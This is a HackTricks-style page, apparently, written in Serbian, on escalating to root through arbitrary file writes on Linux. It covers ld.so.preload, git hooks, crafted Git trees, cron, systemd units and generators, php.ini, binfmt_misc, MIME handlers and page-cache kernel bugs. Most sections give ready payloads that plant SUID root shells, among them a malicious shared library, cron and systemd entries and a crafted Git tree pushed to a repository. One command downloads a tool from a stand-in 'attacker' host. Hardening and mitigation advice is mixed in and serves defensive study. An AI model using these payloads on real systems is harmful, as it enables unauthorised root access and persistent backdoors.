# Proizvoljno pisanje datoteke kao root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` je sistemska lista deljenih objekata koje dinamički linker učitava pre drugih deljenih objekata. Režim bezbednog izvršavanja uvodi dodatna ograničenja za preloading, pa putanja do biblioteke kao što je `/tmp/pe.so` nije univerzalna tehnika za SUID binarne fajlove.\
Ako možete da kreirate ili izmenite ovu datoteku, proces koji je učitava učitaće navedenu biblioteku pre ostalih deljenih objekata, što omogućava izvršavanje koda u kontekstu tog procesa.<sup>[[12]](#references)</sup>

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** su izvršne skripte koje se pokreću prilikom događaja u repozitorijumu, uključujući operacije commit i merge. Ako **privilegovana skripta ili korisnik** izvršava te radnje, a napadač može da **piše u fasciklu `.git`**, hook se može iskoristiti za **privilege escalation**.<sup>[[13]](#references)</sup>

Na primer, moguće je **generisati skriptu** u git repozitorijumu u fascikli **`.git/hooks`**, tako da se uvek izvršava kada se napravi novi commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal pri izvozu Git stabla sa privilegijama

Privilegovani sinhronizator može da izbegne checkout i umesto toga nabroji repozitorijum pod uticajem napadača pomoću `git ls-tree`, pročita svaki blob pomoću `git cat-file`, spoji prijavljenu putanju sa staging direktorijumom i sam je upiše. To postaje **arbitrary file write sa privilegijama sinhronizatora** kada se `-c safe.directory=*` (čime se isključuje Git-ova zaštita za repozitorijume u vlasništvu drugog korisnika) kombinuje sa izostankom provere da li se odredište nalazi unutar dozvoljenog direktorijuma. Ime stavke stabla sa apsolutnom putanjom dovodi do toga da Python-ov `os.path.join(stage, name)` odbaci `stage`; relativno ime koje sadrži `../` izlazi izvan njega kada ga sistem datoteka razreši. Pošto aplikacija materijalizuje sirovo stablo umesto da zatraži od Git-a da ga checkout-uje, odbijanje putanja tokom checkout-a ne štiti odredišno mesto.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Potražite ovakav oblik koda u root servisima, tajmerima, agentima za deployment, alatima za uvoz šablona i zadacima za backup/restore:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Unos u stablu kodiran je kao `<mode> SP <name> NUL <raw object ID>`. Opcija `git hash-object --literally` namerno dozvoljava podatke objekta koje uobičajeno parsiranje ili `git fsck` mogu odbaciti, pa se u klonu za jednokratnu upotrebu može napraviti stablo čije je ime fajla apsolutna odredišna putanja. Ovaj primer pravi blob cron datoteke, umotava kreirano stablo u commit i pomera granu na njega; za eksploataciju je i dalje potrebna dozvola za ažuriranje repozitorijuma koji koristi privilegovani posao i Git server koji prihvata neispravan objekat.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Ojačavanje mora obuhvatiti i preuzimanje repozitorijuma i završnu operaciju nad fajl sistemom:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Zamenite `safe.directory=*` tačnim repozitorijumima kojima servis mora da veruje i, gde je moguće, obrađujte repozitorijume bez root privilegija.
- Odbacite apsolutne nazive i svaku komponentu `.` ili `..` pre materijalizacije. Nakon spajanja putanja, kanonizujte je i proverite da odredište ostaje unutar predviđenog korena.
- Izbegavajte trke između provere i otvaranja symlink-a: otvarajte putanje relativno u odnosu na pouzdani deskriptor direktorijuma, a na Linux-u koristite `openat2()` sa `RESOLVE_BENEATH` i `RESOLVE_NO_SYMLINKS` za putanje koje kontroliše napadač.
- Dajte prednost uobičajenom checkout-u u izolovanom direktorijumu umesto ponovnoj implementaciji checkout-a na osnovu plumbing izlaza. Ako je neophodno preuzimanje sirovih objekata, omogućite validaciju na strani receive-a, kao što je `receive.fsckObjects=true`; nemojte snižavati nivo ozbiljnosti nalaza `receive.fsck.*` povezanih sa imenima putanja, koji su neophodni za odbacivanje posebno napravljenih stabala.

### Privilegovano postavljanje konfiguracije

Neki servisi za upravljanje čuvaju željeno stanje sistema u konfiguracionom fajlu, a kasnije ga postavljaju sa povišenim privilegijama. Na primer, [openmediavault čuva konfiguraciju u `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), a njegov [RPC interfejs](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) može da primeni izmene servisa. Ako nalog sa nižim privilegijama može da upisuje u taj fajl ili da ga zameni, proverite da li može i da zatraži ovlašćeno postavljanje i da li izabrani modul koristi izmenjeno polje kao root. SSH ključevi naloga, zakazane komande i instalacija paketa imaju različite preduslove; samo postojanje fajla ili XML fajla u koji može da se upisuje ne dokazuje nijedno od toga. Proverite dozvole fajla i nadređenog direktorijuma, grupe korisnika koji poziva RPC i njegova ovlašćenja, instaliranu verziju i stvarnog potrošača, bez menjanja konfiguracije ili pozivanja operacije primene tokom enumeracije.

Definicije akcija Fail2Ban-a u `/etc/fail2ban/action.d/` predstavljaju još jednu granicu privilegovane konfiguracije. Korisnik koji može da upisuje u taj direktorijum i da ga pretražuje možda može da zameni definiciju akcije ili doda override, ali samo dozvole direktorijuma ne dokazuju izvršavanje koda. Potvrdite da omogućeni jail zaista bira pogođenu akciju, da Fail2Ban servis izvršava tu akciju sa višim privilegijama i da će se desiti ovlašćeno ponovno učitavanje/pokretanje i odgovarajući ban događaj. Nepovezana sudo dozvola za ponovno pokretanje Fail2Ban-a relevantna je samo kada se odnosi na tačno pozivanje servisa i kada se učitava izmenjena definicija. [Konfiguracija akcija u Fail2Ban-u](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) dokumentuje vezu između direktorijuma akcija i jail-a; njegov [primer akcije](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) pokazuje da se `actionban` izvršava prilikom ban-a, sa pravima korisnika servisa. Pregledajte dozvole i efektivnu konfiguraciju bez menjanja akcija ili pokretanja ban-ova tokom enumeracije.

Zasebna granica postoji kada omogućeni Fail2Ban jail koristi mail akciju obogaćenu WHOIS podacima. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) odnosio se na nepouzdan WHOIS tekst prosleđen kroz pipe GNU mailutils `mail` komandi, čija je obrada escape sekvenci mogla da pokrene komandu. Korisnik sa nižim privilegijama koji može da upisuje u fajl možda može da utiče na odgovor ako može da izmeni konfiguraciju za override servera **izabranog WHOIS klijenta**; [Debian-ov `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) dokumentuje jedan takav fajl, ali njegova putanja i upotreba variraju u zavisnosti od instalacije. Proverite efektivni jail/akciju, identitet servisa, stvarni WHOIS klijent i putanju konfiguracije, implementaciju mail-a, mogućnost kontrole odgovora i instaliranu ispravku dobavljača ili backport. WHOIS konfiguracioni fajl u koji može da se upisuje, Fail2Ban verzija ili mail akcija sami po sebi ne dokazuju ovaj lanac; tokom pasivne enumeracije nemojte slati upite eksternom serveru niti pokretati ban-ove.

### TFTP kreiranje fajlova i privilegovane package hook funkcije

Dostupan TFTP servis može da pređe granicu kontejnera ili lokalnog korisnika kada njegove **efektivne** postavke tftpd-hpa rade kao root, izlažu koren fajl sistema kao direktorijum `--secure` i omogućavaju `--create`. [Uputstvo za tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) opisuje opcije za kreiranje i korisnika. Ovo je mogući način za kreiranje novog fajla u privilegovanom konfiguracionom direktorijumu, uključujući `/etc/apt/apt.conf.d/`; postojeći fajl i dalje može biti zaštićen od zamene. [APT uputstvo za konfiguraciju](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) dokumentuje komande `APT::Update::Pre-Invoke`. `apt update` pokrenut kao root može postati potrošač sa višim privilegijama **samo ako** učita novi konfiguracioni fajl. Potvrdite stvarne argumente i identitet aktivnog daemon-a, mrežnu dostupnost i filtriranje, pravila za kreiranje fajlova u ciljnom direktorijumu, efektivni opseg APT konfiguracije i kasnije privilegovano pozivanje. Podrazumevani fajl, direktorijum u koji može da se upisuje ili zakazana APT komanda sami po sebi ne dokazuju ceo tok. Pasivna trijaža treba da čita samo lokalnu konfiguraciju i metapodatke ograničene veličine, bez otpremanja fajla ili pozivanja APT-a.

### Cron i vremenski fajlovi

Ako možete da **upisujete u cron fajlove koje root izvršava**, obično možete da dobijete izvršavanje koda pri sledećem pokretanju zadatka. Zanimljive mete uključuju:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root-ov sopstveni crontab u `/var/spool/cron/` ili `/var/spool/cron/crontabs/`
- `systemd` tajmere i servise koje pokreću

Brze provere:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Tipični putevi zloupotrebe:

- **Dodavanje novog root cron job-a** u `/etc/crontab` ili fajl u `/etc/cron.d/`
- **Zamena skripte** koju već izvršava `run-parts`
- **Postavljanje backdoor-a u postojeći timer target** izmenom skripte ili binarne datoteke koju pokreće

Minimalni primer cron payload-a:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Ako možete da pišete samo unutar cron direktorijuma koji koristi `run-parts`, umesto toga tamo postavite izvršnu datoteku:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Napomene:

- `run-parts` obično ignoriše nazive datoteka koji sadrže tačke, zato prednost dajte nazivima kao što je `backup`, umesto `backup.sh`.<sup>[[15]](#references)</sup>
- Neki sistemi koriste `systemd` tajmere umesto klasičnog cron-a, ali ideja zloupotrebe je ista: **izmenite ono što će root kasnije izvršiti**.<sup>[[20]](#references)</sup>

### Servisne i Socket datoteke

Ako možete da upisujete u **`systemd` unit datoteke** ili datoteke na koje one upućuju, možda možete da pokrenete kod kao root ponovnim učitavanjem i restartovanjem unita ili čekanjem da se aktivira servis/socket putanja.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Proverite i dozvole za upis i pretragu nad samim sistemskim direktorijumom unit datoteka, uključujući ACL-ove: korisnik može da kreira novi unit u `/etc/systemd/system` čak i kada mu je onemogućeno čitanje/listanje direktorijuma. Sama ta putanja ne pokreće ništa. Potvrdite da će system manager učitati novi unit, da pozivalac ima efektivno `systemctl start` ili `restart` pravo za njegovo ime koje omogućava izvršavanje kao root (ili neku drugu privilegovanu putanju za aktivaciju) i da se servis pokreće pod željenim identitetom. Izmenjeni postojeći unit koji je već učitan može zahtevati `daemon-reload`; ponašanje pri učitavanju novog unita sa drugačijim imenom nije isto. Pre nego što pravilo za restart sa džokerom smatrate dovoljnim, proverite tačne sudo argumente i izuzetke. Pogledajte [putanju za pretragu systemd unita](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) i [semantiku učitavanja i ponovnog učitavanja systemctl-a](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Zanimljive mete uključuju:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in override-i u `/etc/systemd/system/<unit>.d/*.conf`
- Servisne skripte/binarne datoteke na koje upućuju `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Putanje `EnvironmentFile=` u koje može da se upisuje, a koje učitava root servis

Brze provere:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Uobičajeni načini zloupotrebe:

- **Prepišite `ExecStart=`** u service unit-u u vlasništvu root-a koji možete da menjate
- **Dodajte drop-in override** sa zlonamernim `ExecStart=` i prvo obrišite stari
- **Postavite backdoor u skriptu/binarnu datoteku** na koju unit već upućuje
- **Otmite socket-activated service** tako što ćete izmeniti odgovarajući `.service` fajl koji se pokreće kada socket primi konekciju

Primer zlonamernog override-a:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Tipičan tok aktivacije:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Ako ne možete sami da restartujete servise, ali možete da izmenite jedinicu aktiviranu preko socket-a, možda je dovoljno da **sačekate vezu klijenta** kako bi se pokrenuo backdoored servis kao root.<sup>[[17]](#references)</sup>

### systemd direktorijumi generatora

**System generators** su izvršne datoteke koje system manager pokreće pre učitavanja unit fajlova, i tokom podizanja sistema i pri ponovnom učitavanju konfiguracije. Zato je pristup za upis u direktorijum system-generatora (ili u postojeći izvršni generator) direktan način za izvršavanje koda kao root, koji je lako prevideti ako se tokom revizije proveravaju samo fajlovi `*.service` i `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Uobičajeni redosled pretrage je `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` i `/usr/lib/systemd/system-generators/` (neke distribucije izlažu `/lib/systemd/system-generators/` kroz spajanje direktorijuma `/usr`). Izvršna datoteka istog imena u ranijem direktorijumu zasenjuje onu u kasnijem. Nemojte mešati ove **ulazne direktorijume izvršnih datoteka** sa direktorijumima `/run/systemd/generator`, `/run/systemd/generator.early` i `/run/systemd/generator.late`, koji sadrže privremeni izlaz jedinica koji generišu generatori.<sup>[[35]](#references)</sup>

Brze provere:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Novokreirani generator mora imati postavljen izvršni bit. Ako primitiva za upis može da kontroliše bajtove, ali ne i režim dozvola, ciljaj već izvršni generator; njegovo skraćivanje na mestu obično čuva metapodatke. Ako je direktorijum sam po sebi upisiv, kreiraj novi unos i označi ga kao izvršan.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Pokretanje komande `systemctl daemon-reload` nad **system** managerom zahteva odgovarajuću autorizaciju, ali ponovo pokreće svaki system generator; u suprotnom sačekajte privileged reload, operaciju paketa ili ponovno pokretanje sistema. Direktorijumi user generatora, kao što je `~/.config/systemd/user-generators/`, izvršavaju se u okviru user managera i **sami po sebi ne daju root**.<sup>[[35]](#references)</sup>

Radi hardeninga i potrage za pretnjama, proveravajte svaku komponentu putanje i ACL-ove, a ne samo završne bits dozvola, pravite osnovne hash vrednosti i beležite vlasništvo paketa za generatore, te upozoravajte na kreiranje, preimenovanje, promene sadržaja ili dozvola u svim ulaznim direktorijumima system generatora. Praćenje upisa je važno zato što one-shot generator može sam sebe da obriše nakon izvršavanja, dok se stablo generisanih jedinica u `/run/systemd/generator*` ponovo izgradi pri sledećem reloadu.<sup>[[35]](#references)[[36]](#references)</sup>

### Prepišite restriktivni `php.ini` koji koristi privilegovani PHP sandbox

Neki prilagođeni daemon-i proveravaju PHP koji je dostavio korisnik tako što pokreću `php` sa **restriktivnim `php.ini`** (na primer, `disable_functions=exec,system,...`). Ako kod u sandboxu i dalje ima **bilo kakvu mogućnost upisa** (kao što je `file_put_contents`), a možete da dođete do **tačne putanje `php.ini`** koju koristi daemon, možete da **prepišete tu konfiguraciju** kako biste uklonili ograničenja, a zatim pošaljete drugi payload koji se izvršava sa povišenim privilegijama.<sup>[[2]](#references)</sup>

Uobičajen tok:

1. Prvi payload prepisuje sandbox konfiguraciju.
2. Drugi payload izvršava kod sada kada su opasne funkcije ponovo omogućene.

Minimalni primer (zamenite putanju koju koristi daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Ako se daemon izvršava kao root (ili proverava putanje u vlasništvu root-a), drugo izvršavanje daje root kontekst. Ovo je u suštini **escalation privilegija putem prepisivanja konfiguracije** kada runtime u sandbox-u i dalje može da upisuje fajlove.

### binfmt_misc

`binfmt_misc` izlaže registracije u okviru `/proc/sys/fs/binfmt_misc`; svaka registracija povezuje obrazac tipa datoteke sa interpreterom. Uticaj na privilegije zavisi od toga ko može da menja registraciju i koji proces kasnije izvršava datoteku koja se podudara, zato proverite te uslove pre nego što ovo smatrate putem za escalation privilegija.<sup>[[21]](#references)</sup>

Izvršivi pomoćni program sa `CAP_DAC_OVERRIDE` može predstavljati zaseban put registracije ako prihvata podatke koje kontroliše pozivalac i upisuje ih u `/proc/sys/fs/binfmt_misc/register`, čak i kada pozivalac ne može direktno da upisuje u taj čvor. Pregledajte ulazne podatke pomoćnog programa i ponašanje pri upisu, ali ga nemojte izvršavati tokom enumeracije. Ako registrovano pravilo koristi oznaku `C`, interpreter dobija akreditive zasnovane na binarnoj datoteci koja se podudara; zato SUID datoteka u vlasništvu root-a može da pokrene interpreter koji kontroliše pozivalac kao root. Proverite montiranje `binfmt_misc` i pravila registracije, efektivnu capability pomoćnog programa, tačno pravilo i putanju interpreter-a, SUID ciljnu datoteku koja se može izvršiti i da li `no_new_privs` ili `nosuid` mount sprečavaju SUID promenu. Sam bit capability-ja ili ugrađena putanja predstavljaju samo trag za proveru.<sup>[[21]](#references)</sup> Pogledajte [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) za uslove koji sprečavaju SUID.

### Prepisivanje rukovalaca šema (poput http: ili https:)

Desktop okruženja koriste MIME asocijacije i desktop stavke da bi izabrala aplikaciju za URI šeme; napadač koji može da upisuje u relevantnu konfiguraciju korisnika i direktorijume desktop stavki može da preusmeri te šeme na pokretač koji kontroliše. Izmenom datoteke `$HOME/.config/mimeapps.list` tako da HTTP i HTTPS URL rukovaoci upućuju na zlonamernu datoteku (na primer, `x-scheme-handler/http=evil.desktop` i `x-scheme-handler/https=evil.desktop`), klik korisnika može da pokrene tu desktop stavku.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root izvršava skripte/binarne fajlove koje korisnik može da menja

Ako privilegovani workflow pokreće nešto poput `/bin/sh /home/username/.../script` (ili bilo koji binarni fajl unutar direktorijuma u vlasništvu neprivilegovanog korisnika), možeš da ga hijack:<sup>[[1]](#references)</sup>

- **Otkrij izvršavanje:** prati procese pomoću pspy da bi uhvatio root kako poziva putanje pod kontrolom korisnika.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Potvrdite mogućnost upisa:** proverite da li su ciljna datoteka i njen direktorijum u vlasništvu vašeg korisnika i da li imate dozvolu za upis.
- **Preotmite cilj:** napravite rezervnu kopiju originalnog binarnog fajla/skripte i postavite payload koji kreira SUID shell (ili izvršava neku drugu root akciju), a zatim vratite dozvole:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Pokrenite privilegovanu akciju** (npr. pritisnite UI dugme koje pokreće pomoćni program). Kada root ponovo pokrene preuzetu putanju, preuzmite shell sa eskalovanim privilegijama pomoću `./rootshell -p`.

### Izmena privilegovanih binarnih datoteka samo u page cache-u

Neke kernel greške ne menjaju datoteku **na disku**. Umesto toga, omogućavaju izmenu samo **kopije u page cache-u** čitljive datoteke. Ako možete da ciljate **setuid** binarnu datoteku ili neku drugu koju pokreće **root**, sledeće izvršavanje može da pokrene bajtove iz memorije koje kontroliše napadač i eskalira privilegije, iako je hash datoteke na disku nepromenjen.<sup>[[3]](#references)[[4]](#references)</sup>

Ovo je korisno posmatrati kao **primitiv za upis u datoteku samo tokom izvršavanja**:<sup>[[3]](#references)</sup>

- **Disk ostaje čist**: inode i bajtovi na disku se ne menjaju
- **Memorija je izmenjena**: procesi koji čitaju/izvršavaju keširanu stranicu dobijaju sadržaj koji je izmenio napadač
- **Efekat je privremen**: izmena nestaje nakon ponovnog pokretanja ili izbacivanja iz keša

Ovaj primitiv se nalazi između klasičnog **arbitrary file write** i starijih grešaka koje zloupotrebljavaju page cache, kao što su Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW se oslanjao na race uslov
- Dirty Pipe je imao ograničenja u poziciji upisa
- Primitiv ograničen na page cache može biti pouzdaniji ako ranjiva putanja omogućava direktan upis u keširane stranice koje potiču iz datoteke

#### Opšti tok privesc-a

1. Nabavite kernel primitiv koji može da upisuje u **stranice page cache-a koje potiču iz datoteke**
2. Iskoristite ga nad **čitljivom privilegovanom binarnom datotekom** ili drugom datotekom koju pokreće root
3. Pokrenite izvršavanje **pre** nego što stranica bude izbačena iz keša
4. Dobijte izvršavanje koda kao root dok datoteka na disku i dalje izgleda neizmenjeno

Tipične mete velike vrednosti:

- **setuid-root** binarne datoteke
- Pomoćni programi koje pokreću **root servisi**
- Binarne datoteke koje se često pokreću iz **kontejnera koji dele kernel/page cache hosta**

#### Primer putanje AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) je dobar primer ove klase. Ranjiva putanja nalazila se u Linux crypto userspace API-ju (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` može da prenese reference na stranice page cache-a iz čitljive datoteke u crypto TX scatterlist
- putanja za dekripciju `algif_aead` u istom baferu ponovo je koristila izvorne i odredišne baferе
- `authencesn` je zatim upisivao u odredišni region taga
- kada je taj region i dalje upućivao na stranice datoteke ubačene pomoću splice-a, upis je završavao u **page cache-u ciljne datoteke**

Zato je zanimljiva tehnika obrazac, a ne sam CVE:

- **prosledite kernel podsistemu stranice keša koje potiču iz datoteke**
- naterajte podsistem da ih **tretira kao izlaz u koji može da se upisuje**
- pokrenite mali, kontrolisani prepis u memoriji

Javni PoC je koristio ponovljene **upise od 4 bajta** da zakrpi `/usr/bin/su` u memoriji, a zatim ga je izvršio.<sup>[[4]](#references)[[7]](#references)</sup>

#### Primer putanje kloniranja ESP / XFRM + netfilter TEE

DirtyClone (CVE-2026-43503) prikazuje drugu varijantu istog obrasca **page-cache-only write-to-root**, ali je ovde ponor **IPsec ESP dekripcija**, umesto `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Važna tehnika je **korak „pranja” metapodataka**:

- `splice()` postavlja **stranicu page cache-a datoteke samo za čitanje** u ESP-in-UDP paket
- prvobitna DirtyFrag zaštita je označila taj skb sa `SKBFL_SHARED_FRAG`, tako da bi `esp_input()` **prvo napravio kopiju, pa tek onda dešifrovao**
- netfilter `TEE` duplira paket kroz `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- klon zadržava **istu fizičku referencu na page cache**, ali gubi `SKBFL_SHARED_FRAG`
- `esp_input()` zatim smatra da je klon bezbedan i izvršava **`cbc(aes)` dekripciju u istom baferu** nad stranicom datoteke

Pouka za recenzente šira je od ovog CVE-a: ako zaštita koristi **skb/page metapodatke** da odluči da li prvo mora da napravi kopiju, svaka **putanja kloniranja/kopiranja koja zadržava pozadinsku stranicu, ali odbacuje metapodatke**, može neprimetno ponovo da otvori primitiv za upis.

Tipičan tok eksploatacije:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` da biste dobili **`CAP_NET_ADMIN` unutar privatnog network namespace-a**
2. podignite loopback i instalirajte **netfilter `TEE` pravilo** u `mangle/OUTPUT`
3. instalirajte **XFRM ESP transport SA-ove** pomoću `NETLINK_XFRM`
4. kodirajte svaku ciljnu 4-bajtnu reč u polju `seq_hi` SA-a (DirtyFrag trik za izbor reči)
5. pošaljite ESP-in-UDP paket ubačen pomoću splice-a, tako da **TEE klon** stigne do `esp_input()` i bude dešifrovan **u istom baferu**
6. ponavljajte dok kopija `/usr/bin/su` u page cache-u ili neka druga privilegovana izvršna datoteka ne sadrži kod koji kontroliše napadač

U praksi, uticaj je isti kao u primeru sa `AF_ALG`: datoteka na disku ostaje čista, ali `execve()` koristi **izmenjene bajtove iz page cache-a** i daje root privilegije.<sup>[[8]](#references)[[9]](#references)</sup>

Korisne provere izloženosti za ovu varijantu:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Kratkoročno smanjenje površine napada i ovde zavisi od putanje: nadogradnja na kernel koji sadrži `48f6a5356a33` ispravlja putanju `clone`, dok blokiranje automatskog učitavanja `xt_TEE` uklanja **korak za prikrivanje zastavice**, a blokiranje `esp4` / `esp6` uklanja **odredište dešifrovanja**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Izloženost i potraga za tragovima

Ako sumnjate na ovu klasu grešaka, nemojte se oslanjati samo na provere integriteta diska. Proverite i sledeće:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Vrednosti konfiguracije u nastavku razlikuju interfejs koji se može učitati od onog koji je ugrađen u kernel; pravila za izgradnju crypto komponenti preslikavaju `CONFIG_CRYPTO_USER_API_AEAD` u `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` se može učitavati i uklanjati kao modul
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs je ugrađen u kernel
- setuid binarne datoteke su dobre mete jer zakrpa koja menja samo page cache može biti dovoljna da se lokalni pristup podigne na root

#### Smanjenje površine napada za putanju `algif_aead`

Ako se ranjivi interfejs obezbeđuje pomoću modula koji se može učitati:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Ako je kompajlirano u kernel, u nekim prijavama je navedeno blokiranje init putanje pomoću:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Ovu vrstu ublažavanja vredi imati na umu i kod drugih kernel LPE-ova: ako eksploatacija zavisi od određenog opcionog interfejsa, njegovo onemogućavanje ili stavljanje na blacklistu može prekinuti putanju eksploatacije čak i pre nego što bude dostupna potpuna nadogradnja kernela.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – preuzimanje kontrole nad skriptom koja se izvršava kao root u PaperCut direktorijumu u koji korisnik može da upisuje](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) – najčešća pitanja](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Objava na Openwall oss-security o CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Ispravka za Linux stable: crypto: algif_aead – vraćanje na rad van mesta](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — savetodavno obaveštenje za CVE-2026-31431](https://copy.fail/)
- [7] [Tehnički izveštaj Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repozitorijum / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
